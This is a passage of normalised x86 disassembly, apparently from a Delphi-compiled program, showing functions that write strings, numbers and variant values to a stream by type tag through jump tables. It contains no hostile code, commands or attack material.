push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_439a57
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4242bc
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4242bc
mov ebx [ ebp - 0x10 ]
mov al 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_439970
pop ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a5e
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
sub_439a68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_439aef
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42423c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4223a0
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42423c
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_422414
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439af6
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_407e40
retn
sub_439b00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_4394fc
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
movzx eax [ eax + lookup_table_439bcc ]
jmp [ eax * 4 + jump_table_439bdf ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4233bc
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push ebp
call sub_439514
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_43956c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_439620
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_439748
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_4399c8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_439a68
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_4395c8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_439894
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4233bc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_439c64
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_439caf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a15c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43aac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439cb6
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_439cbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_439d42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_422f98
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xb
call sub_43af10
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_42348c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43ae34
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_43ab2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d49
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_439d50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_439db0
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_42fcdc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_439310
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43922c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439db7
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_439dbc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x2c ]
call sub_4070fc
xor eax eax
push ebp
push sub_439e37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
xor edx edx
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_438b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e3e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_4070a8
retn
sub_439e60
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_439f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4233bc
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax ]
cmp eax 0x9
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f51
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
jmp [ eax * 4 + jump_table_439eaa ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_439d50
pop ecx
jmp r-xdata
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_438aac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_438afc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_439cbc
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_422fa4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43922c
sub_439f58
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_423f18
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
movzx eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_439178
mov esp ebp
pop ebp
retn
sub_439f98
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_424334
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_439384
pop ecx
pop ecx
pop ebp
retn
sub_439fd4
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_43a03e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_423978
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43af08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a045
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
sub_43a064
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a155
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4070a8
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a15c
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_407564
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_43a04c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_407648
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_43a064
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_407648
jmp r-xdata
sub_43a1a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_43a39f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4233bc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_43af10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3a6
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_4068c4
retn
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x2c ]
call sub_4070fc
xor eax eax
push ebp
push sub_43a320
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_40a15c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x2c ]
push [ ebp - 0xc ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx 0x3
call sub_407648
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_439434
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_4070a8
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_4233bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_43a064
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_43922c
jmp r-xdata
sub_43a3bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_43a479
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_424398
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_43af10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a480
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_43a064
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43922c
sub_43a498
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43a51a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4242bc
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43922c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_43af10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a521
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_43a528
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_43a581
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42423c
mov eax [ ebp + 0x8 ]
push eax
call sub_439c64
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43a6e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a588
lea eax [ ebp - 0x10 ]
call sub_41c29c
retn
sub_43a58c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43af24
mov eax [ ebp - 0x8 ]
push [ eax + 0x4c ]
push [ eax + 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_439b00
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_4394fc
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_4233bc
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
movzx eax [ eax + lookup_table_43a65d ]
jmp [ eax * 4 + jump_table_43a670 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_4233bc
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_439e60
pop ecx
jmp r-xdata
push ebp
call sub_439f58
pop ecx
jmp r-xdata
push ebp
call sub_439fd4
pop ecx
jmp r-xdata
push ebp
call sub_43a1a8
pop ecx
jmp r-xdata
push ebp
call sub_43a498
pop ecx
jmp r-xdata
push ebp
call sub_43a528
pop ecx
jmp r-xdata
push ebp
call sub_439f98
pop ecx
jmp r-xdata
push ebp
call sub_43a3bc
pop ecx
sub_43a6e0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43aaa1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4224f4
test al al
je r-xdata
movzx eax [ ebx ]
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_41e92c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_439208
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_41d82c
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_439384
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_420a64
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_43af08
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aaa8
lea eax [ ebp - 0x3c ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x34 ]
call sub_409cb4
lea eax [ ebp - 0x30 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
xor eax eax
push ebp
push sub_43aa48
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_422ab0
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43a757 ]
mov eax ebx
call sub_41d82c
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_439384
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_41e370
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_420a64
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_43ad1c
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_409cb4
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_4210e4
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_418a80
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x8 ]
call sub_43af10
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43af10
jmp r-xdata
mov eax ebx
call sub_41e92c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_43919c
jmp r-xdata
mov eax ebx
call sub_41e92c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_439178
jmp r-xdata
mov eax ebx
call sub_41f350
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_4391e4
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_420a64
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_43ad1c
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x8 ]
call sub_43af10
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x8 ]
call sub_43af10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43aa37
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x14 ] eax
push 0x400
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cf0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43a9dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
call sub_4054c8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x18 ]
call sub_43ad1c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x18 ]
call sub_4389ac
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_4389ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a9e4
mov eax [ ebp - 0x18 ]
call sub_4055f0
retn
sub_43a9e4
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
mov dl 0xa
mov eax [ ebp - 0x8 ]
call sub_43af10
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_4389ac
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4389ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4055f0
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
sub_43aac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ab06
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_407564
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ae34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab0d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_43ab2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406bfc
xor eax eax
push ebp
push sub_43abd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_406a80
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax ebx
call sub_4389ac
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0xff
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4389ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43abe0
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_406a80
sub_43abe8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_406bfc
xor eax eax
push ebp
push sub_43ad0f
